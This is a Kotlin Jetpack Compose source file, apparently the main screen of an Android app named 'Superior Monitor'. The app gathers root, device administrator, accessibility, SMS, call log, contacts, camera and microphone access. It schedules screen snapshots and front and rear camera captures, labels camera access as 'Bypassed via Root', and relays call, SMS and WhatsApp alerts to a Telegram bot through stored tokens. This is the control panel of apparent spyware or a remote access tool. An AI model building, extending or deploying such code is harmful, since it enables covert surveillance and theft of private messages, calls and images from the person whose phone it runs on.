package com.system.superiormonitor.ui

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.BackHandler
import androidx.compose.animation.*
import androidx.compose.animation.core.tween
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.system.superiormonitor.bot.BotService
import com.system.superiormonitor.monitor.SnapshotScheduler
import com.system.superiormonitor.receiver.MonitorDeviceAdminReceiver
import com.system.superiormonitor.util.LogManager
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.theme.*
import kotlinx.coroutines.launch

fun Context.findActivity(): ComponentActivity? = when (this) {
    is ComponentActivity -> this
    is android.content.ContextWrapper -> baseContext.findActivity()
    else -> null
}

enum class NavScreen(val title: String, val icon: ImageVector) {
    Dashboard("Dashboard", Icons.Outlined.SpaceDashboard),
    Permissions("Permissions", Icons.Outlined.Lock),
    RecordSettings("Recorder", Icons.Outlined.Mic),
    Logs("Logs", Icons.Outlined.List),
    Settings("Settings", Icons.Outlined.Settings)
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AppScreen(
    viewModel: MainViewModel,
    requestPostNotifications: () -> Unit
) {
    val context = LocalContext.current
    val lifecycleOwner = LocalLifecycleOwner.current
    val scope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var currentScreen by remember { mutableStateOf(NavScreen.Dashboard) }
    val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)

    // State from ViewModel
    val dashboardState by viewModel.dashboardState.collectAsState()
    val permissionStatus by viewModel.permissionStatus.collectAsState()
    val isServiceRunning by viewModel.isServiceRunning.collectAsState()
    val isTelegramApiReachable by viewModel.isTelegramApiReachable.collectAsState()

    DisposableEffect(currentScreen, lifecycleOwner) {
        val observer = LifecycleEventObserver { _, event ->
            when (event) {
                Lifecycle.Event.ON_RESUME -> {
                    viewModel.refreshPermissions()
                    if (currentScreen == NavScreen.Dashboard) {
                        viewModel.setDashboardScreenActive(true)
                        viewModel.checkTelegramConnection()
                    }
                }
                Lifecycle.Event.ON_PAUSE -> {
                    viewModel.setDashboardScreenActive(false)
                }
                else -> {}
            }
        }
        
        if (lifecycleOwner.lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)) {
            if (currentScreen == NavScreen.Dashboard) {
                viewModel.setDashboardScreenActive(true)
                viewModel.checkTelegramConnection()
            }
        }

        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
            viewModel.setDashboardScreenActive(false)
        }
    }

    val permissionStates = listOf(
        PermissionState("Root Access", permissionStatus.hasRoot) {
            viewModel.refreshPermissions()
            if (!permissionStatus.hasRoot) scope.launch { snackbarHostState.showSnackbar("Root request failed. Check Magisk/KernelSU.") }
        },
        PermissionState("Notification Listener", permissionStatus.hasNotifListener) { context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
        PermissionState("Accessibility Service", permissionStatus.hasAccessibility) { context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
        PermissionState("Device Administrator", permissionStatus.hasDeviceAdmin) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MonitorDeviceAdminReceiver::class.java))
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for SuperiorMonitor functionality.")
            context.startActivity(intent)
        },
        PermissionState("Display Over Other Apps", permissionStatus.hasSystemAlertWindow) { context.startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${context.packageName}"))) },
        PermissionState("Ignore Battery Optimizations", permissionStatus.hasIgnoreBattery) { context.startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, Uri.parse("package:${context.packageName}"))) },
        PermissionState("Call Access", permissionStatus.hasCallAccess) {
            context.findActivity()?.let { activity ->
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_PHONE_STATE),
                    1001
                )
            }
        },
        PermissionState("SMS Access", permissionStatus.hasSmsAccess) {
            context.findActivity()?.let { activity ->
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS),
                    1002
                )
            }
        },
        PermissionState("Contacts Access", permissionStatus.hasContactsAccess) {
            context.findActivity()?.let { activity ->
                ActivityCompat.requestPermissions(
                    activity,
                    arrayOf(Manifest.permission.READ_CONTACTS),
                    1003
                )
            }
        },
        PermissionState(
            name = "Camera Access",
            isGranted = permissionStatus.hasCameraAccess,
            displayStatus = if (!permissionStatus.hasCameraAccess && permissionStatus.hasRoot) "Bypassed via Root" else null
        ) {
            try {
                context.findActivity()?.let { activity ->
                    ActivityCompat.requestPermissions(
                        activity,
                        arrayOf(Manifest.permission.CAMERA, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE),
                        1004
                    )
                }
            } catch (e: Exception) {
                // Ignore if framework throws exception when requesting permissions
            }
        },
        PermissionState("Microphone Access", permissionStatus.hasMicrophoneAccess) {
            try {
                context.findActivity()?.let { activity ->
                    ActivityCompat.requestPermissions(
                        activity,
                        arrayOf(Manifest.permission.RECORD_AUDIO),
                        1005
                    )
                }
            } catch (e: Exception) {
                // Ignore
            }
        },
        PermissionState(
            name = "Modify System Settings",
            isGranted = permissionStatus.hasWriteSettings,
            onClick = {
                try {
                    val writeSettingsIntent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                        data = Uri.parse("package:${context.packageName}")
                    }
                    context.startActivity(writeSettingsIntent)
                } catch (e: Exception) {
                    val fallback = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    context.startActivity(fallback)
                }
            }
        ),
        PermissionState("Post Notifications", permissionStatus.hasPostNotifs) { requestPostNotifications() }
    )

    if (currentScreen != NavScreen.Dashboard) {
        BackHandler {
            currentScreen = NavScreen.Dashboard
        }
    }

    ModalNavigationDrawer(
        drawerState = drawerState,
        drawerContent = {
            ModalDrawerSheet(
                drawerContainerColor = DrawerBackground,
                drawerShape = RoundedCornerShape(topEnd = 32.dp, bottomEnd = 32.dp),
                modifier = Modifier.fillMaxHeight().width(255.dp)
            ) {
                Spacer(Modifier.statusBarsPadding())
                Spacer(Modifier.height(8.dp))

                // Header Area
                Surface(
                    color = InnerCardSurface,
                    shape = RoundedCornerShape(20.dp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(start = 16.dp, end = 16.dp, bottom = 16.dp)
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(start = 16.dp, end = 16.dp, top = 16.dp, bottom = 24.dp)
                    ) {
                        Icon(
                            Icons.Outlined.Lock,
                            contentDescription = "Lock",
                            tint = TextPrimary,
                            modifier = Modifier.size(24.dp)
                        )
                        Spacer(modifier = Modifier.height(16.dp))
                        Text(
                            "Superior Monitor",
                            style = MaterialTheme.typography.titleLarge,
                            color = TextPrimary
                        )
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(
                            "Author Sandesh",
                            style = MaterialTheme.typography.labelSmall,
                            color = TextSecondary
                        )
                    }
                }

                HorizontalDivider(
                    color = Color.DarkGray.copy(alpha = 0.5f),
                    modifier = Modifier.padding(horizontal = 16.dp)
                )
                Spacer(modifier = Modifier.height(16.dp))

                // NAVIGATION Group
                Text(
                    "NAVIGATION",
                    style = MaterialTheme.typography.labelSmall,
                    color = TextSecondary.copy(alpha = 0.6f),
                    letterSpacing = 1.5.sp,
                    modifier = Modifier.padding(start = 32.dp, bottom = 16.dp)
                )

                NavScreen.entries.filter { it != NavScreen.Settings }.forEach { screen ->
                    val isSelected = currentScreen == screen
                    val containerColor = if (isSelected) MaterialTheme.colorScheme.primary.copy(alpha = 0.15f) else Color.Transparent
                    val iconColor = if (isSelected) MaterialTheme.colorScheme.primary else TextSecondary
                    val textColor = if (isSelected) MaterialTheme.colorScheme.primary else TextPrimary
                    Surface(
                        selected = isSelected,
                        onClick = { currentScreen = screen; scope.launch { drawerState.close() } },
                        color = containerColor,
                        shape = RoundedCornerShape(50),
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 16.dp, vertical = 2.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically,
                            modifier = Modifier.padding(start = 16.dp, top = 12.dp, bottom = 12.dp, end = 16.dp)
                        ) {
                            Icon(
                                screen.icon,
                                contentDescription = screen.title,
                                tint = iconColor,
                                modifier = Modifier.size(24.dp)
                            )
                            Spacer(modifier = Modifier.width(16.dp))
                            Text(
                                screen.title,
                                color = textColor,
                                fontWeight = if (isSelected) FontWeight.SemiBold else FontWeight.Normal
                            )
                        }
                    }
                }

                Spacer(modifier = Modifier.weight(1f))

                HorizontalDivider(
                    color = DividerColor,
                    modifier = Modifier.padding(horizontal = 16.dp)
                )
                Spacer(modifier = Modifier.height(16.dp))

                // EXTERNAL LINKS Group
                Text(
                    "EXTERNAL LINKS",
                    style = MaterialTheme.typography.labelSmall,
                    color = TextSecondary.copy(alpha = 0.6f),
                    letterSpacing = 1.5.sp,
                    modifier = Modifier.padding(start = 32.dp, bottom = 16.dp)
                )

                val uriHandler = androidx.compose.ui.platform.LocalUriHandler.current
                DrawerSocialRow(Icons.Outlined.Link, "LinkedIn") {
                    uriHandler.openUri("https://www.linkedin.com/in/sandesh-sahu/")
                }
                DrawerSocialRow(Icons.Outlined.Code, "GitHub") {
                    uriHandler.openUri("https://github.com/sandeshsahu1")
                }
                DrawerSocialRow(Icons.Outlined.AccountTree, "GitLab") {
                    uriHandler.openUri("https://gitlab.com/sandeshsahu")
                }
                
                Spacer(modifier = Modifier.height(32.dp))

            }
        }
    ) {
        Scaffold(
            topBar = {
                CenterAlignedTopAppBar(
                    title = {
                        Text(
                            currentScreen.title,
                            style = MaterialTheme.typography.titleLarge.copy(fontWeight = FontWeight.Bold),
                            color = TextPrimary
                        )
                    },
                    navigationIcon = {
                        if (currentScreen == NavScreen.Settings) {
                            IconButton(onClick = { currentScreen = NavScreen.Dashboard }) {
                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back", tint = TextPrimary)
                            }
                        } else {
                            IconButton(onClick = { scope.launch { drawerState.open() } }) {
                                Icon(Icons.Filled.Menu, contentDescription = "Menu", tint = TextPrimary)
                            }
                        }
                    },
                    actions = {
                        if (currentScreen == NavScreen.Dashboard) {
                            IconButton(onClick = { currentScreen = NavScreen.Settings }) {
                                Icon(Icons.Outlined.Settings, contentDescription = "Settings", tint = TextSecondary)
                            }
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(containerColor = TopBarBackground)
                )
            },
            snackbarHost = {
                SnackbarHost(snackbarHostState) { data ->
                    Snackbar(
                        snackbarData = data,
                        containerColor = OuterCardSurface,
                        contentColor = TextPrimary,
                        actionColor = AccentGreen
                    )
                }
            },
            containerColor = Background
        ) { innerPadding ->
            Box(modifier = Modifier.fillMaxSize().padding(innerPadding)) {
                AnimatedContent(
                    targetState = currentScreen,
                    transitionSpec = {
                        (slideInHorizontally { width -> width / 6 } + fadeIn(
                            animationSpec = tween(300)
                        )) togetherWith (slideOutHorizontally { width -> -width / 6 } + fadeOut(
                            animationSpec = tween(200)
                        ))
                    },
                    label = "screen_transition"
                ) { screen ->
                    when (screen) {
                        NavScreen.Dashboard -> DashboardScreen(
                            dashboardState = dashboardState,
                            isServiceRunning = isServiceRunning,
                            isTelegramApiReachable = isTelegramApiReachable,
                            hasCredentials = viewModel.hasCredentials,
                            allPermissionsGranted = permissionStatus.allPermissionsGranted,
                            onEvent = { event ->
                                viewModel.onDashboardEvent(event)
                                
                                // Handle side-effects that require Context or Intent
                                when (event) {
                                    is DashboardEvent.ToggleService -> {
                                        if (!event.enabled) {
                                            viewModel.disableAllFeatures()
                                            context.stopService(Intent(context, BotService::class.java))
                                            Toast.makeText(context, "Service Stopped", Toast.LENGTH_SHORT).show()
                                            SnapshotScheduler(context).cancelSnapshot()
                                            SnapshotScheduler(context).cancelCamera(1)
                                            SnapshotScheduler(context).cancelCamera(0)
                                        } else {
                                            if (!viewModel.hasCredentials || !permissionStatus.allPermissionsGranted) {
                                                viewModel.onDashboardEvent(DashboardEvent.ToggleService(false))
                                                val missing = mutableListOf<String>()
                                                if (!viewModel.hasCredentials) missing.add("Credentials")
                                                if (!permissionStatus.hasRoot) missing.add("Root")
                                                if (!permissionStatus.hasDeviceAdmin) missing.add("DeviceAdmin")
                                                if (!permissionStatus.hasNotifListener) missing.add("NotifListener")
                                                if (!permissionStatus.hasAccessibility) missing.add("Accessibility")
                                                if (!permissionStatus.hasSystemAlertWindow) missing.add("Overlay")
                                                if (!permissionStatus.hasIgnoreBattery) missing.add("BatteryOpt")
                                                if (!permissionStatus.hasCallAccess) missing.add("CallAccess")
                                                if (!permissionStatus.hasSmsAccess) missing.add("SmsAccess")
                                                if (!permissionStatus.hasContactsAccess) missing.add("ContactsAccess")
                                                if (!permissionStatus.hasMicrophoneAccess) missing.add("MicrophoneAccess")
                                                if (!permissionStatus.hasCameraAccess && !permissionStatus.hasRoot) missing.add("CameraAccess")
                                                if (!permissionStatus.hasWriteSettings) missing.add("WriteSettings")
                                                val msg = "❌ Missing: ${missing.joinToString()}"
                                                LogManager.log(LogCategory.SYSTEM, msg)
                                                scope.launch { snackbarHostState.showSnackbar(msg) }
                                            } else {
                                                context.startForegroundService(Intent(context, BotService::class.java))
                                                Toast.makeText(context, "Service Started", Toast.LENGTH_SHORT).show()
                                            }
                                        }
                                    }
                                    is DashboardEvent.ToggleSnapshots -> {
                                        if (event.enabled) SnapshotScheduler(context).scheduleNextSnapshot()
                                        else SnapshotScheduler(context).cancelSnapshot()
                                    }
                                    is DashboardEvent.UpdateSnapshotInterval -> {
                                        if (dashboardState.enableSnapshots) {
                                            SnapshotScheduler(context).cancelSnapshot()
                                            SnapshotScheduler(context).scheduleNextSnapshot()
                                        }
                                    }
                                    is DashboardEvent.ToggleFrontCamera -> {
                                        if (event.enabled) SnapshotScheduler(context).scheduleNextCamera(1)
                                        else SnapshotScheduler(context).cancelCamera(1)
                                    }
                                    is DashboardEvent.UpdateFrontCameraInterval -> {
                                        if (dashboardState.enableFrontCamera) {
                                            SnapshotScheduler(context).cancelCamera(1)
                                            SnapshotScheduler(context).scheduleNextCamera(1)
                                        }
                                    }
                                    is DashboardEvent.ToggleRearCamera -> {
                                        if (event.enabled) SnapshotScheduler(context).scheduleNextCamera(0)
                                        else SnapshotScheduler(context).cancelCamera(0)
                                    }
                                    is DashboardEvent.UpdateRearCameraInterval -> {
                                        if (dashboardState.enableRearCamera) {
                                            SnapshotScheduler(context).cancelCamera(0)
                                            SnapshotScheduler(context).scheduleNextCamera(0)
                                        }
                                    }
                                    is DashboardEvent.ToggleWhatsappUpdates -> {
                                        // ViewModel handles BotService notification after async validation
                                    }
                                    is DashboardEvent.ToggleCallAlerts -> {
                                        if (isServiceRunning) {
                                            val intent = Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_CALL_ALERTS" }
                                            context.startForegroundService(intent)
                                        }
                                    }
                                    is DashboardEvent.ToggleSmsAlerts -> {
                                        if (isServiceRunning) {
                                            val intent = Intent(context, BotService::class.java).apply { action = "ACTION_UPDATE_SMS_ALERTS" }
                                            context.startForegroundService(intent)
                                        }
                                    }
                                    else -> {} // No context side-effects required
                                }
                            },
                            snackbarHostState = snackbarHostState
                        )
                        NavScreen.Permissions -> PermissionsScreen(permissions = permissionStates)
                        NavScreen.Logs -> LogsScreen(onClearLogs = { category ->
                            viewModel.clearLogs(category)
                        })
                        NavScreen.Settings -> SettingsScreen(
                            isRootEnabled = permissionStatus.hasRoot,
                            isInternetConnected = permissionStatus.isInternetConnected,
                            botToken = viewModel.botToken,
                            chatId = viewModel.chatId,
                            ownerUserId = viewModel.ownerUserId,
                            onBotTokenChange = { viewModel.botToken = it },
                            onChatIdChange = { viewModel.chatId = it },
                            onOwnerIdChange = { viewModel.ownerUserId = it },
                            isBotRunning = isServiceRunning,
                            onSave = {
                                viewModel.saveCredentials()
                                Toast.makeText(context, "Credentials Saved", Toast.LENGTH_SHORT).show()
                            }
                        )
                        NavScreen.RecordSettings -> BCRSettingsScreen()
                    }
                }
            }
        }
    }
}

@Composable
fun DrawerSocialRow(
    icon: ImageVector,
    label: String,
    onClick: () -> Unit
) {
    Surface(
        onClick = onClick,
        color = Color.Transparent,
        shape = RoundedCornerShape(50),
        modifier = Modifier
            .fillMaxWidth()
            .padding(horizontal = 16.dp, vertical = 2.dp)
    ) {
        Row(
            modifier = Modifier.padding(start = 16.dp, top = 12.dp, bottom = 12.dp, end = 16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(
                icon,
                contentDescription = label,
                tint = TextSecondary,
                modifier = Modifier.size(24.dp)
            )
            Spacer(modifier = Modifier.width(16.dp))
            Text(
                label,
                color = TextPrimary,
                fontWeight = FontWeight.Normal
            )
        }
    }
}
